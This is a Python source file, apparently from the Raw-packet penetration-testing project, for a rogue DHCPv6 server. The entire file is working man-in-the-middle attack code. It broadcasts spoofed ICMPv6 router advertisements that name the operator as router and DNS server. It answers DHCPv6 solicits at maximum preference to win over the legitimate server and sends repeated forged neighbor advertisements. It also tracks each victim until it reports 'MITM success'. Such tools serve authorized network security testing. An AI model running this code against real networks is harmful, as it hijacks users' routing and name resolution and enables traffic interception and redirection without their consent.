# region Description
"""
dhcpv6_server.py: DHCPv6 server (dhcpv6_server)
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from raw_packet.Utils.base import Base
from raw_packet.Utils.utils import Utils
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.network import RawSniff, RawSend, RawEthernet, RawICMPv6, RawDHCPv6
from typing import Union, Dict, Any
from random import randint
from time import sleep

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion


# region class DHCPv6Server
class DHCPv6Server:

    # region Set properties
    _base: Base = Base()
    _utils: Utils = Utils()
    _sniff: RawSniff = RawSniff()
    _eth: RawEthernet = RawEthernet()
    _icmpv6: RawICMPv6 = RawICMPv6()
    _dhcpv6: RawDHCPv6 = RawDHCPv6()
    _thread_manager: ThreadManager = ThreadManager(10)

    _your: Dict[str, Union[None, str]] = {'network-interface': None, 'mac-address': None, 'ipv6-link-address': None}
    _target: Dict[str, Union[None, str]] = {'mac-address': None, 'ipv6-address': None}
    _clients: Dict[str, Dict[str, Union[bool, str]]] = dict()

    _ipv6_prefix: str = 'fde4:8dba:82e1:ffff::/64'
    _ipv6_prefix_address: str = 'fde4:8dba:82e1:ffff::'
    
    _first_ipv6_address_suffix: int = 2
    _last_ipv6_address_suffix: int = 65534
    
    _domain_search: str = 'domain.local'
    
    _solicit_packets_delay: float = 1
    
    _disable_dhcpv6: bool = False
    _exit_on_success: bool = False
    _quiet: bool = True
    # endregion

    # region Init
    def __init__(self, network_interface: str):
        self._your = self._base.get_interface_settings(interface_name=network_interface,
                                                       required_parameters=['mac-address',
                                                                            'ipv6-link-address'])
        self._dns_server_ipv6_address: str = self._your['ipv6-link-address']
        self._raw_send: RawSend = RawSend(network_interface=network_interface)
    # endregion

    # region Start DHCPv6 Server
    def start(self,
              target_mac_address: Union[None, str] = None,
              target_ipv6_address: Union[None, str] = None,
              first_ipv6_address_suffix: int = 2,
              last_ipv6_address_suffix: int = 65534,
              dns_server_ipv6_address: Union[None, str] = None,
              ipv6_prefix: str = 'fde4:8dba:82e1:ffff::/64',
              domain_search: str = 'domain.local',
              disable_dhcpv6: bool = False,
              exit_on_success: bool = False,
              quiet: bool = False) -> None:

        # region Set variables
        self._ipv6_prefix: str = ipv6_prefix
        self._ipv6_prefix_address: str = self._ipv6_prefix.split('/')[0]
        self._disable_dhcpv6 = disable_dhcpv6
        self._domain_search = domain_search
        self._exit_on_success = exit_on_success
        self._quiet = quiet
        # endregion

        # region Set target MAC and IPv6 address, if target IP is not set - get first and last suffix IPv6 address

        # region Set target IPv6 address
        if target_mac_address is not None:
            self._target['mac-address'] = \
                self._utils.check_mac_address(mac_address=target_mac_address,
                                              parameter_name='target MAC address')
        # endregion

        # region Target IPv6 is set
        if target_ipv6_address is not None:
            assert target_mac_address is not None, \
                'Please set target MAC address for target IPv6 address: ' + \
                self._base.info_text(str(target_ipv6_address))
            self._target['ipv6-address'] = \
                self._utils.check_ipv6_address(network_interface=self._your['network-interface'],
                                               ipv6_address=target_ipv6_address,
                                               is_local_ipv6_address=False,
                                               parameter_name='target IPv6 address')
            self._clients[self._target['mac-address']] = {'advertise address': self._target['ipv6-address']}
        # endregion

        # region Target IPv6 is not set - get first and last suffix IPv6 address
        else:
            # Check first suffix IPv6 address
            self._first_ipv6_address_suffix = \
                self._utils.check_value_in_range(value=first_ipv6_address_suffix,
                                                 first_value=1, 
                                                 last_value=65535,
                                                 parameter_name='first IPv6 address suffix')

            # Check last suffix IPv6 address
            self._last_ipv6_address_suffix = \
                self._utils.check_value_in_range(value=last_ipv6_address_suffix,
                                                 first_value=self._first_ipv6_address_suffix, 
                                                 last_value=65535,
                                                 parameter_name='last IPv6 address suffix')
        # endregion

        # endregion

        # region Set recursive DNS server address
        if dns_server_ipv6_address is not None:
            self._dns_server_ipv6_address = \
                self._utils.check_ipv6_address(network_interface=self._your['network-interface'],
                                               ipv6_address=dns_server_ipv6_address,
                                               is_local_ipv6_address=False,
                                               parameter_name='DNS server IPv6 address',
                                               check_your_ipv6_address=False)
        # endregion

        # region General output
        if not self._quiet:
            self._base.print_info('Network interface: ', self._your['network-interface'])
            self._base.print_info('Your MAC address: ', self._your['mac-address'])
            self._base.print_info('Your link local IPv6 address: ', self._your['ipv6-link-address'])

            if self._target['mac-address'] is not None:
                self._base.print_info('Target MAC address: ', self._target['mac-address'])
            if self._target['ipv6-address'] is not None:
                self._base.print_info('Target IPv6 address: ', self._target['ipv6-address'])
            else:
                self._base.print_info('First suffix offer IP: ', str(self._first_ipv6_address_suffix))
                self._base.print_info('Last suffix offer IP: ', str(self._last_ipv6_address_suffix))

            self._base.print_info('Prefix: ', self._ipv6_prefix)
            self._base.print_info('Router IPv6 address: ', self._your['ipv6-link-address'])
            self._base.print_info('DNS IPv6 address: ', self._dns_server_ipv6_address)
            self._base.print_info('Domain search: ', self._domain_search)
        # endregion

        # region Send ICMPv6 advertise packets in other thread
        self._thread_manager.add_task(self._send_icmpv6_advertise_packets)
        # endregion

        # region Add multicast MAC addresses on interface
        self._add_multicast_mac_addresses()
        # endregion

        # region Start Sniffer

        # region Print info message
        self._base.print_info('Waiting for a ICMPv6 or DHCPv6 requests ...')
        # endregion

        # region Set sniff filters
        sniff_filters: Dict = {'Ethernet': {'not-source': self._your['mac-address']},
                               'UDP': {'destination-port': 547, 'source-port': 546},
                               'ICMPv6': {'types': [133, 135]}}
        scapy_lfilter: Any = lambda eth: eth.src != self._your['mac-address']

        if self._target['mac-address'] is not None:
            sniff_filters['Ethernet'] = {'source': self._target['mac-address']}
            scapy_lfilter: Any = lambda eth: eth.src == self._target['mac-address']
        # endregion

        # region Start sniffer
        self._sniff.start(protocols=['IPv6', 'UDP', 'ICMPv6', 'DHCPv6'], prn=self._reply,
                          filters=sniff_filters,
                          network_interface=self._your['network-interface'],
                          scapy_filter='icmp6 or (udp and (port 547 or 546))',
                          scapy_lfilter=scapy_lfilter)
        # endregion

        # endregion

    # endregion

    # region Add multicast MAC addresses on interface
    def _add_multicast_mac_addresses(self):
        self._base.add_multicast_mac_address(interface_name=self._your['network-interface'],
                                             multicast_mac_address='33:33:00:00:00:02',
                                             exit_on_failure=False,
                                             quiet=self._quiet)
        self._base.add_multicast_mac_address(interface_name=self._your['network-interface'],
                                             multicast_mac_address='33:33:00:01:00:02',
                                             exit_on_failure=False,
                                             quiet=self._quiet)
    # endregion

    # region Add client info in global self._clients dictionary
    def _add_client_info_in_dictionary(self,
                                       client_mac_address: str,
                                       client_info: Dict[str, Union[bool, str]],
                                       this_client_already_in_dictionary: bool = False):
        if this_client_already_in_dictionary:
            self._clients[client_mac_address].update(client_info)
        else:
            self._clients[client_mac_address] = client_info
    # endregion

    # region Send ICMPv6 solicit packets
    def _send_icmpv6_solicit_packets(self):
        try:
            while True:
                icmpv6_solicit_packet = \
                    self._icmpv6.make_router_solicit_packet(ethernet_src_mac=self._your['mac-address'],
                                                            ipv6_src=self._your['ipv6-link-address'],
                                                            need_source_link_layer_address=True,
                                                            source_link_layer_address=self._eth.make_random_mac())
                self._raw_send.send_packet(icmpv6_solicit_packet)
                sleep(self._solicit_packets_delay)
        except KeyboardInterrupt:
            self._base.print_info('Exit')
            exit(0)
    # endregion

    # region Send DHCPv6 solicit packets
    def _send_dhcpv6_solicit_packets(self):
        try:
            while True:
                request_options = [23, 24]
                dhcpv6_solicit_packet = \
                    self._dhcpv6.make_solicit_packet(ethernet_src_mac=self._your['mac-address'],
                                                     ipv6_src=self._your['ipv6-link-address'],
                                                     transaction_id=randint(1, 16777215),
                                                     client_mac_address=self._eth.make_random_mac(),
                                                     option_request_list=request_options)
                self._raw_send.send_packet(dhcpv6_solicit_packet)
                sleep(self._solicit_packets_delay)
        except KeyboardInterrupt:
            self._base.print_info('Exit ....')
            exit(0)
    # endregion

    # region Send ICMPv6 advertise packets
    def _send_icmpv6_advertise_packets(self):
        icmpv6_ra_packet = \
            self._icmpv6.make_router_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                          ethernet_dst_mac='33:33:00:00:00:01',
                                                          ipv6_src=self._your['ipv6-link-address'],
                                                          ipv6_dst='ff02::1',
                                                          dns_address=self._dns_server_ipv6_address,
                                                          domain_search=self._domain_search,
                                                          prefix=self._ipv6_prefix,
                                                          router_lifetime=5000,
                                                          advertisement_interval=
                                                          int(self._solicit_packets_delay * 1000))
        try:
            while True:
                self._raw_send.send_packet(icmpv6_ra_packet)
                sleep(self._solicit_packets_delay)
        except KeyboardInterrupt:
            self._base.print_info('Exit')
            exit(0)
    # endregion

    # region Reply to DHCPv6 and ICMPv6 requests
    def _reply(self, packet):

        # region Get client MAC address
        client_mac_address: str = packet['Ethernet']['source']
        # endregion

        # region Check this client already in self._clients dictionary
        client_already_in_dictionary: bool = False
        if client_mac_address in self._clients.keys():
            client_already_in_dictionary = True
        # endregion

        # region Check MiTM status for this client
        self._check_mitm_status(client_mac_address=client_mac_address)
        # endregion

        # region ICMPv6
        if 'ICMPv6' in packet.keys():

            # region ICMPv6 Router Solicitation
            if packet['ICMPv6']['type'] == 133:

                # Make and send ICMPv6 router advertisement packet
                icmpv6_ra_packet = \
                    self._icmpv6.make_router_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                                  ethernet_dst_mac=packet['Ethernet']['source'],
                                                                  ipv6_src=self._your['ipv6-link-address'],
                                                                  ipv6_dst=packet['IPv6']['source-ip'],
                                                                  dns_address=self._dns_server_ipv6_address,
                                                                  domain_search=self._domain_search,
                                                                  prefix=self._ipv6_prefix,
                                                                  router_lifetime=5000)
                self._raw_send.send_packet(icmpv6_ra_packet)

                # Print info messages
                self._base.print_info('ICMPv6 Router Solicitation request from: ', 
                                      packet['IPv6']['source-ip'] + ' (' + 
                                      packet['Ethernet']['source'] + ')')
                self._base.print_info('ICMPv6 Router Advertisement reply to: ', 
                                      packet['IPv6']['source-ip'] + ' (' + 
                                      packet['Ethernet']['source'] + ')')

                # Delete this client from global self._clients dictionary
                try:
                    del self._clients[client_mac_address]
                    client_already_in_dictionary = False
                except KeyError:
                    pass

                # Add client info in global self._clients dictionary
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'router solicitation': True,
                                                     'network prefix': self._ipv6_prefix},
                                                    client_already_in_dictionary)
            # endregion

            # region ICMPv6 Neighbor Solicitation
            if packet['ICMPv6']['type'] == 135:

                # region Get ICMPv6 Neighbor Solicitation target address
                target_address: str = packet['ICMPv6']['target-address']
                na_packet: Union[None, bytes] = None
                if target_address.startswith('fe80::'):
                    if target_address == self._your['ipv6-link-address']:
                        self._add_client_info_in_dictionary(client_mac_address,
                                                            {'neighbor solicitation your address': True},
                                                            client_already_in_dictionary)
                else:
                    na_packet = \
                        self._icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=self._your['mac-address'],
                                                                        ipv6_src=self._your['ipv6-link-address'],
                                                                        target_ipv6_address=target_address)
                # endregion

                # region Neighbor Solicitation target address is DNS server IPv6 address
                if self._dns_server_ipv6_address != self._your['ipv6-link-address']:
                    if self._dns_server_ipv6_address.startswith(self._ipv6_prefix_address) or \
                            self._dns_server_ipv6_address.startswith('fe80::'):
                        if target_address == self._dns_server_ipv6_address:
                            self._add_client_info_in_dictionary(client_mac_address,
                                                                {'neighbor solicitation dns server address': True},
                                                                client_already_in_dictionary)
                # endregion

                # region Neighbor Solicitation target address not in your ipv6 prefix
                if not target_address.startswith(self._ipv6_prefix_address) and na_packet is not None:
                    for _ in range(10):
                        self._raw_send.send_packet(na_packet)
                # endregion

                # region Neighbor Solicitation target address in your ipv6 prefix
                else:
                    self._add_client_info_in_dictionary(client_mac_address,
                                                        {'neighbor solicitation in ipv6 prefix': True},
                                                        client_already_in_dictionary)
                # endregion

                # region DHCPv6 advertise address is set

                # This client already in dictionary
                if client_already_in_dictionary:

                    # Advertise address for this client is set
                    if 'advertise address' in self._clients[client_mac_address].keys():

                        # ICMPv6 Neighbor Solicitation target address is DHCPv6 advertise IPv6 address
                        if target_address == self._clients[client_mac_address]['advertise address']:

                            # Add client info in global self._clients dictionary
                            self._add_client_info_in_dictionary(client_mac_address,
                                                                {'neighbor solicitation advertise address': True},
                                                                client_already_in_dictionary)

                        # ICMPv6 Neighbor Solicitation target address is not DHCPv6 advertise IPv6 address
                        elif na_packet is not None:
                            for _ in range(10):
                                self._raw_send.send_packet(na_packet)
                # endregion

            # endregion

        # endregion

        # region DHCPv6

        # Protocol DHCPv6 is enabled
        if not self._disable_dhcpv6 and 'DHCPv6' in packet.keys():

            # region Get Client identifier and Identity Association for Non-temporary Address
            cid: Union[None, bytes] = None
            iaid: Union[None, int] = None

            for option in packet['DHCPv6']['options']:
                if option['type'] == 1:
                    cid = option['value']['raw']
                elif option['type'] == 3:
                    iaid = option['value']['iaid']

            if cid is None or iaid is None:
                self._base.print_info('Malformed DHCPv6 packet from: ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']))
                return
            # endregion

            # region DHCPv6 Solicit
            if packet['DHCPv6']['message-type'] == 1:

                # Set IPv6 address in advertise packet
                try:
                    ipv6_address = self._clients[client_mac_address]['advertise address']
                except KeyError:
                    if self._target['ipv6-address'] is not None:
                        ipv6_address = self._target['ipv6-address']
                    else:
                        ipv6_address = self._ipv6_prefix_address + \
                                       format(randint(self._first_ipv6_address_suffix,
                                                      self._last_ipv6_address_suffix), 'x')

                # Make and send DHCPv6 advertise packet
                dhcpv6_advertise = \
                    self._dhcpv6.make_advertise_packet(ethernet_src_mac=self._your['mac-address'],
                                                       ethernet_dst_mac=packet['Ethernet']['source'],
                                                       ipv6_src=self._your['ipv6-link-address'],
                                                       ipv6_dst=packet['IPv6']['source-ip'],
                                                       transaction_id=packet['DHCPv6']['transaction-id'],
                                                       dns_address=self._dns_server_ipv6_address,
                                                       domain_search=self._domain_search,
                                                       ipv6_address=ipv6_address,
                                                       cid=cid, iaid=iaid, preference=255)
                self._raw_send.send_packet(dhcpv6_advertise)

                # Print info messages
                self._base.print_info('DHCPv6 Solicit from: ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']))
                self._base.print_info('DHCPv6 Advertise to: ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']),
                                      ' IAA: ', ipv6_address)

                # Add client info in global self._clients dictionary
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'dhcpv6 solicit': True,
                                                     'advertise address': ipv6_address},
                                                    client_already_in_dictionary)
            # endregion

            # region DHCPv6 Request
            if packet['DHCPv6']['message-type'] == 3:

                # Set DHCPv6 reply packet
                dhcpv6_reply: Union[None, bytes] = None

                # region Get Client DUID time, IPv6 address and Server MAC address
                client_ipv6_address: Union[None, str] = None
                server_mac_address: Union[None, str] = None

                for dhcpv6_option in packet['DHCPv6']['options']:
                    if dhcpv6_option['type'] == 2:
                        server_mac_address = dhcpv6_option['value']['mac-address']
                    if dhcpv6_option['type'] == 3:
                        client_ipv6_address = dhcpv6_option['value']['ipv6-address']
                # endregion

                if server_mac_address is not None and client_ipv6_address is not None:

                    # Check Server MAC address
                    if server_mac_address != self._your['mac-address']:
                        self._add_client_info_in_dictionary(
                            client_mac_address,
                            {'dhcpv6 mitm': 'error: server mac address is not your mac address'},
                            client_already_in_dictionary)
                    else:
                        self._add_client_info_in_dictionary(
                            client_mac_address,
                            {'dhcpv6 mitm': 'success'},
                            client_already_in_dictionary)
                        try:
                            if client_ipv6_address == self._clients[client_mac_address]['advertise address']:
                                dhcpv6_reply = \
                                    self._dhcpv6.make_reply_packet(ethernet_src_mac=self._your['mac-address'],
                                                                   ethernet_dst_mac=packet['Ethernet']['source'],
                                                                   ipv6_src=self._your['ipv6-link-address'],
                                                                   ipv6_dst=packet['IPv6']['source-ip'],
                                                                   transaction_id=packet['DHCPv6']['transaction-id'],
                                                                   dns_address=self._dns_server_ipv6_address,
                                                                   domain_search=self._domain_search,
                                                                   ipv6_address=client_ipv6_address,
                                                                   cid=cid)
                                self._raw_send.send_packet(dhcpv6_reply)
                            else:
                                self._add_client_info_in_dictionary(
                                    client_mac_address,
                                    {'dhcpv6 mitm': 'error: client request address is not advertise address'},
                                    client_already_in_dictionary)

                        except KeyError:
                            self._add_client_info_in_dictionary(
                                client_mac_address,
                                {'dhcpv6 mitm': 'error: not found dhcpv6 solicit request for this client'},
                                client_already_in_dictionary)

                    # Print info messages
                    self._base.print_info('DHCPv6 Request from: ',
                                          packet['IPv6']['source-ip'] + ' (' +
                                          packet['Ethernet']['source'] + ')',
                                          ' XID: ', hex(packet['DHCPv6']['transaction-id']),
                                          ' Server: ', server_mac_address,
                                          ' IAA: ', client_ipv6_address)

                    if dhcpv6_reply is not None:
                        self._base.print_info('DHCPv6 Reply to:     ',
                                              packet['IPv6']['source-ip'] + ' (' +
                                              packet['Ethernet']['source'] + ')',
                                              ' XID: ', hex(packet['DHCPv6']['transaction-id']),
                                              ' Server: ', server_mac_address,
                                              ' IAA: ', client_ipv6_address)
                    else:
                        if self._clients[client_mac_address]['dhcpv6 mitm'] == \
                                'error: server mac address is not your mac address':
                            self._base.print_error('Server MAC address in DHCPv6 Request is not your MAC address ' +
                                                   'for this client: ', client_mac_address)

                        if self._clients[client_mac_address]['dhcpv6 mitm'] == \
                                'error: client request address is not advertise address':
                            self._base.print_error('Client requested IPv6 address is not advertise IPv6 address ' +
                                                   'for this client: ', client_mac_address)

                        if self._clients[client_mac_address]['dhcpv6 mitm'] == \
                                'error: not found dhcpv6 solicit request for this client':
                            self._base.print_error('Could not found DHCPv6 solicit request ' +
                                                   'for this client: ', client_mac_address)

            # endregion

            # region DHCPv6 Release
            if packet['DHCPv6']['message-type'] == 8:
                # Print info message
                self._base.print_info('DHCPv6 Release from: ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']))

                # Delete this client from global self._clients dictionary
                try:
                    del self._clients[client_mac_address]
                    client_already_in_dictionary = False
                except KeyError:
                    pass
            # endregion

            # region DHCPv6 Confirm
            if packet['DHCPv6']['message-type'] == 4:

                # region Get Client IPv6 address
                client_ipv6_address: Union[None, str] = None

                for dhcpv6_option in packet['DHCPv6']['options']:
                    if dhcpv6_option['type'] == 3:
                        client_ipv6_address = dhcpv6_option['value']['ipv6-address']
                # endregion

                # region Make and send DHCPv6 Reply packet
                dhcpv6_reply = \
                    self._dhcpv6.make_reply_packet(ethernet_src_mac=self._your['mac-address'],
                                                   ethernet_dst_mac=packet['Ethernet']['source'],
                                                   ipv6_src=self._your['ipv6-link-address'],
                                                   ipv6_dst=packet['IPv6']['source-ip'],
                                                   transaction_id=packet['DHCPv6']['transaction-id'],
                                                   dns_address=self._dns_server_ipv6_address,
                                                   domain_search=self._domain_search,
                                                   ipv6_address=client_ipv6_address,
                                                   cid=cid)
                self._raw_send.send_packet(dhcpv6_reply)
                # endregion

                # region Add Client info in global self._clients dictionary and print info message
                self._add_client_info_in_dictionary(client_mac_address,
                                                    {'advertise address': client_ipv6_address,
                                                     'dhcpv6 mitm': 'success'},
                                                    client_already_in_dictionary)

                self._base.print_info('DHCPv6 Confirm from: ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']),
                                      ' IAA: ', client_ipv6_address)
                self._base.print_info('DHCPv6 Reply to:     ',
                                      packet['IPv6']['source-ip'] + ' (' +
                                      packet['Ethernet']['source'] + ')',
                                      ' XID: ', hex(packet['DHCPv6']['transaction-id']),
                                      ' IAA: ', client_ipv6_address)
                # endregion

            # endregion

        # endregion

    # endregion

    # region Check MiTM Success
    def _check_mitm_status(self, client_mac_address: str):
        try:
            if not self._disable_dhcpv6:
                assert self._clients[client_mac_address]['dhcpv6 mitm'] == 'success'
                # assert self._clients[client_mac_address]['neighbor solicitation advertise address']

            else:
                if self._dns_server_ipv6_address != self._your['ipv6-link-address']:
                    if self._dns_server_ipv6_address.startswith(self._ipv6_prefix_address) or \
                            self._dns_server_ipv6_address.startswith('fe80::'):
                        assert self._clients[client_mac_address]['neighbor solicitation dns server address']

                assert self._clients[client_mac_address]['neighbor solicitation your address']
                assert self._clients[client_mac_address]['neighbor solicitation in ipv6 prefix']

            assert 'success message' not in self._clients[client_mac_address].keys()
            self._base.print_success('MITM success: ',
                                     self._clients[client_mac_address]['advertise address'] +
                                     ' (' + client_mac_address + ')')
            if self._exit_on_success:
                sleep(3)
                exit(0)
            else:
                self._clients[client_mac_address].update({'success message': True})
            return True

        except KeyError:
            return False

        except AssertionError:
            return False
    # endregion

# endregion
